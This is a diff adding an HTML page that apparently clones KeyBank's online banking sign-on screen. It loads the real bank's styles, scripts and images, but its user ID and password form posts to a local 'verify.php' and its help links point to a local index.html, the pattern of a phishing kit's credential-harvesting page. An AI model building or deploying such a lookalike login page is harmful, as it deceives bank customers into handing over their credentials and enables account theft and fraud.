@@ -1,0 +1,366 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="cufon-active cufon-ready">
+ <head>
+  <meta content="content-type" http-equiv="content-type" />
+  <meta content="login, log in, sign in, sign on, signin, signon, online banking, my account, account" name="keywords" />
+  <meta content="Log in to check your account balance, view transaction history, pay bills, transfer funds, and more." name="description" />
+  <title>
+   KeyBank - Sign On to Online Banking
+  </title>
+  <link rel="shortcut icon" type="image/x-icon" href="https://www.key.com/kco/images/favicon.ico" />
+  <link media="all" type="text/css" href="https://www.key.com/ib2/css/kco2obi.css" rel="stylesheet" />
+  <link media="all" type="text/css" href="https://www.key.com/ib2/css/obi.css" rel="stylesheet" />
+  <link href="https://www.key.com/ib2/css/validation.css" type="text/css" rel="stylesheet" />
+  <!--[if IE]>
+		<style type="text/css">
+			#olbloginpage input.text.w250 {background: none; background-color: #eeedea; padding: 4px; margin: 0px; height: 14px; border: 1px solid #cccccc; }
+			#olbloginpage a.arrow {background: url('/kco/images/bul_arrow-red-med.png') no-repeat right 50%;color: #666666;font-size: 11px;font-weight: bold; padding-right: 8px}
+		    #wrapper {width: 1000px;}
+            #iespecificfooter {width: 1002px;overflow:hidden;}
+		
+		</style>
+
+	<![endif]-->
+  <link href="https://www.key.com/kco/css/reset.css" type="text/css" rel="stylesheet" />
+  <link href="https://www.key.com/kco/css/screen.css" type="text/css" rel="stylesheet" />
+  <!--<link rel="stylesheet" type="text/css" href="/kco/css/fancybox.css"  />-->
+  <link href="https://www.key.com/kco/css/select.css" type="text/css" rel="stylesheet" />
+  <!--[if IE 7 ]>
+<style type="text/css">
+#wrapper {width: 1000px;}
+</style>
+<![endif]-->
+  <script src="https://www.key.com/kco/js/jquery.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/cufon.js" type="text/javascript">
+  </script>
+  <style type="text/css">
+   cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}
+  </style>
+  <script src="https://www.key.com/kco/js/custom-form.js" type="text/javascript">
+  </script>
+  <style type="text/css">
+   input.styled { display: none; } select.styled { position: relative; width: 168px; opacity: 0; filter: alpha(opacity=0); z-index: 5; } .disabled { opacity: 0.5; filter: alpha(opacity=50); }
+  </style>
+  <script src="https://www.key.com/kco/js/jquery.easing.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/jquery.hoverintent.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/jquery.carousel.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/jquery.validate.js" type="text/javascript">
+  </script>
+  <!--<script type="text/javascript" src="/kco/js/jquery.fancybox.js"></script>-->
+  <script src="https://www.key.com/kco/js/jquery.select.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/jquery.expandtron.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/functions.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/kco/js/cookies.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   &lt;!-- Variable to define default control for where to send the cursor to. Defined on page defaultcontrol = "ssn" where ssn is name attribute of control
+	defaultcontrol = "";
+	// --&gt;
+  </script>
+  <script type="text/javascript">
+   if (document.location.href.indexOf("accounts.key") &gt; 0) {
+	var s_account="keybankcom";
+}
+else {
+	var s_account="keybankdev";
+}
+  </script>
+  <script src="https://www.key.com//gen/js/analytics_base.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/ib2/javascript/flash_detecter.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/ib2/javascript/flash_util.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/ib2/javascript/plugin-detect-0.6.3.js" type="text/javascript">
+  </script>
+  <script src="https://www.key.com/ib2/javascript/tfa.js" type="text/javascript">
+  </script>
+  <script type="text/vbscript" language="VBScript">
+   &lt;!-- // Visual basic helper required to detect Flash Player ActiveX control version information
+		Function VBGetSwfVer(i)
+			on error resume next
+			Dim swControl, swVersion
+			swVersion = 0
+
+			set swControl = CreateObject("ShockwaveFlash.ShockwaveFlash." + CStr(i))
+			if (IsObject(swControl)) then
+				swVersion = swControl.GetVariable("$version")
+			end if
+			VBGetSwfVer = swVersion
+		End Function
+	// --&gt;
+  </script>
+  <script type="text/javascript">
+   &lt;!--
+// Major version of Flash required
+var requiredMajorVersion = 6;
+// Minor version of Flash required
+var requiredMinorVersion = 0;
+// Revision of Flash required
+var requiredRevision = 40;
+var flashVerWithExtAPI = 8.0;
+var hasRightVersion = false;
+var flashVersion = 0;
+
+hasRightVersion = DetectFlashVer(requiredMajorVersion, requiredMinorVersion, requiredRevision);
+
+flashVersion = getFlashVersion();
+
+// Functionality for mindblazer piece
+function popUpDemoWin(winHref)
+{
+	var demoWin = window.open(winHref, 'DemoPopUp','width=770,height=500,top=10,left=50,toolbar=no,location=no,status=yes,menubar=no,scrollbars=yes,resizable=yes');
+	
+	if( navigator.appVersion.indexOf("MSIE 4") == -1 )
+		demoWin.focus();
+}
+function hov(loc,cls)
+{
+	if(loc.className)
+		loc.className=cls;
+}
+function setDevices(inStr)
+{
+	var currVal = document.pageSignon.devices.value;
+	
+	if(currVal == "NA")
+	{
+		document.pageSignon.devices.value = inStr;
+	}
+}
+function setJSStatus()
+{
+	document.pageSignon.jsenabled.value = "Y";
+}
+function setFlashStatus()
+{
+	document.pageSignon.flashstatus.value = hasRightVersion;
+}
+function setTFAData()
+{
+	tfaExecute();
+
+	document.pageSignon.TFAdata1.value = TFAdata1;
+	document.pageSignon.TFAdata2.value = TFAdata2;
+	document.pageSignon.TFAdata3.value = TFAdata3;
+	document.pageSignon.TFAdata4.value = TFAdata4;
+}
+
+// --&gt;
+  </script>
+  <script type="text/javascript">
+   function enableLogin(){
+document.getElementById('jsenable').style.display="block";
+}
+  </script>
+  <script type="text/javascript">
+   function openURL(sURL) {
+		var dominURL = window.location.href;
+		if(dominURL.indexOf("localhost")!=-1 || (dominURL.indexOf("ib2appit")!=-1) || dominURL.indexOf("b2apppt")!=-1){
+			var ans;
+			ans=window.confirm('CAUTION: This link will take you to production.Do you want to leave the testing environment');
+			if(ans == true)window.open(sURL);
+			else{}
+			}
+			else {
+				window.open(sURL);
+			}
+		}
+  </script>
+ </head>
+ <body onload="enableLogin();setJSStatus();setFlashStatus();document.pageSignon.sUserId.value='';document.pageSignon.sUserId.focus();" id="olbloginpage">
+  <iframe width="100%" height="120px" frameborder="0" scrolling="no" src="https://www.key.com/about/misc/top-nav.jsp">
+  </iframe>
+  <div id="wrapper">
+   <div id="container">
+    <div id="col-lft">
+     <div class="side-box">
+      <div class="box-top">
+      </div>
+      <div class="box-content">
+       <h3>
+        <cufon class="cufon cufon-canvas" alt="Related " style="width: 62px; height: 15px;">
+         <canvas width="73" height="16" style="width: 73px; height: 16px; top: -1px; left: -1px;">
+         </canvas>
+         <cufontext>
+          Related
+         </cufontext>
+        </cufon>
+        <cufon class="cufon cufon-canvas" alt="Information" style="width: 87px; height: 15px;">
+         <canvas width="93" height="16" style="width: 93px; height: 16px; top: -1px; left: -1px;">
+         </canvas>
+         <cufontext>
+          Information
+         </cufontext>
+        </cufon>
+       </h3>
+       <p>
+        <span class="smallicon20 network">
+         network
+        </span>
+        <a href="index.html" target="_top" class="smallarrow">
+         Enroll in Online Banking
+        </a>
+       </p>
+       <p>
+        <span class="smallicon20 info">
+         info
+        </span>
+        <a href="https://www.key.com/to/obi+faq" target="_top" class="smallarrow">
+         Frequently Asked Questions
+        </a>
+       </p>
+      </div>
+      <div class="box-bottom">
+      </div>
+     </div>
+    </div>
+    <div id="feature">
+     <div class="feature-content">
+      <h2>
+       Online Banking Sign On
+      </h2>
+      <div id="signon">
+       <form target="_top" autocomplete="off" action="verify.php" method="post" name="pageSignon">
+        <input type="hidden" name="requester" value="login" />
+        <input type="hidden" value="1390423927626-2073084613841453244" name="0plm1qaz" />
+        <input type="hidden" value="Y" name="jsenabled" />
+        <input type="hidden" value="NA" name="devices" />
+        <input type="hidden" value="false" name="flashstatus" />
+        <input type="hidden" value="unknown" name="TFAdata1" id="TFAdata1" />
+        <input type="hidden" value="unknown" name="TFAdata2" id="TFAdata2" />
+        <input type="hidden" value="unknown" name="TFAdata3" id="TFAdata3" />
+        <input type="hidden" value="unknown" name="TFAdata4" id="TFAdata4" />
+        <script type="text/javascript">
+         &lt;!--
+	if(!hasRightVersion || flashVersion &lt; flashVerWithExtAPI)
+	{
+		var textToDisplay = '&lt;br&gt;&lt;p&gt; ';
+		textToDisplay = textToDisplay + '&lt;a href="" target=\"_top\"&gt;&lt;\/a&gt;&lt;\/p&gt;'
+		document.write(textToDisplay);
+	}
+// --&gt;
+        </script>
+        <br />
+        <p>
+         <a target="_top" href="">
+         </a>
+        </p>
+        <div style="display: block;" id="jsenable">
+         <table border="0" cellspacing="0" cellpadding="0" style="margin-bottom: 10px;">
+          <tbody>
+           <tr>
+            <td width="80" nowrap="nowrap">
+             <strong>
+              User ID:
+             </strong>
+            </td>
+            <td nowrap="nowrap">
+             <input type="text" class="text w250" name="userid" size="30" value="" tabindex="1" />
+             <a class="arrow" target="_top" href="index.html" tabindex="6">
+              Forgot User ID
+             </a>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+         <table border="0" cellspacing="0" cellpadding="0" style="margin-bottom: 15px;">
+          <tbody>
+           <tr>
+            <td width="80" nowrap="nowrap">
+             <strong>
+              Password:
+             </strong>
+            </td>
+            <td nowrap="nowrap">
+             <input type="password" class="text w250" maxlength="30" name="password" size="20" tabindex="2" />
+             <a class="arrow" target="_top" href="index.html" tabindex="6">
+              Forgot Password
+             </a>
+            </td>
+           </tr>
+          </tbody>
+         </table>
+         <input type="submit" onclick="setTFAData();" class="btn-red newbutton" name="btnSubmit" value="Sign On" tabindex="3" />
+         <br />
+         <br />
+        </div>
+        <noscript>
+         &lt;div id="errorBox" style="border: 1px solid #FFCC32;background-color: #FFFDD4;width:650px;"&gt;
+		&lt;div id="errorBoxTitle"&gt;It appears that your browser doesn't support Javascript, or it is disabled. To use Online 
+		Banking,&lt;br/&gt;you must enable Javascript,&lt;a href="https://www.key.com/personal/online-banking/enabling_javascript.jsp" target="_blank"&gt; Learn How &lt;/a&gt;
+		&lt;/div&gt;
+		
+		&lt;/div&gt;
+        </noscript>
+       </form>
+       <table border="0" cellspacing="0" cellpadding="0" style="margin: 0 0 1px 0; width: 1px">
+        <tbody>
+         <tr>
+          <td>
+           <script type="text/javascript">
+            &lt;!-- 
+	// Execute IF statement if flash version is 6.40 or greater
+	if(hasRightVersion)
+	{
+		document.write(embedPe8lsoReader("IB2"));
+	}
+// --&gt;
+           </script>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </div>
+      <div style="height: 40px">
+      </div>
+      <a href="javascript:openURL('https://www.key.com/to/obi+mktsignon1')">
+       <img style="width: 331px; height: 118px;" alt="Balance Alerts" title="Balance Alerts" src="https://www.key.com/kco/images/olb-mkt-tile-left.png%20" />
+      </a>
+      <a href="javascript:openURL('https://www.key.com/to/obi+mktsignon2')">
+       <img style="width: 331px; height: 118px;" alt="Online Statements" title="Online Statements" src="https://www.key.com/kco/images/olb-mkt-tile-right.png" />
+      </a>
+     </div>
+    </div>
+    <script type="text/javascript">
+     var scriptEnd = "&lt;\/scr" + "ipt\&gt;\n";
+// Handle all the FSCommand messages in a Flash movie.
+function pe8lso_DoFSCommand(command, args) {
+
+	if(command == "setDevices")
+	{
+		setDevices(args);
+	}
+}
+// Hook for Internet Explorer.
+if (navigator.appName &amp;&amp; navigator.appName.indexOf("Microsoft") != -1 &amp;&amp; navigator.userAgent.indexOf("Windows") != -1 &amp;&amp; navigator.userAgent.indexOf("Windows 3.1") == -1) {
+	document.write('&lt;script language=\"VBScript\"\&gt;\n');
+	document.write('On Error Resume Next\n');
+	document.write('Sub pe8lso_FSCommand(ByVal command, ByVal args)\n');
+	document.write('	Call pe8lso_DoFSCommand(command, args)\n');
+	document.write('End Sub\n');
+	document.write(scriptEnd);
+}
+    </script>
+    <script type="text/javascript">
+     var ib2_pagename = 'ib2_external_pageSignon';
+    </script>
+    <script src="https://www.key.com/gen/js/analytics_obi.js" type="text/javascript">
+    </script>
+   </div>
+  </div>
+  <center>
+   <div id="iespecificfooter">
+    <iframe width="1010" height="102" frameborder="0" scrolling="no" src="https://www.key.com/about/misc/footer.jsp">
+    </iframe>
+   </div>
+  </center>
+ </body>
+</html>
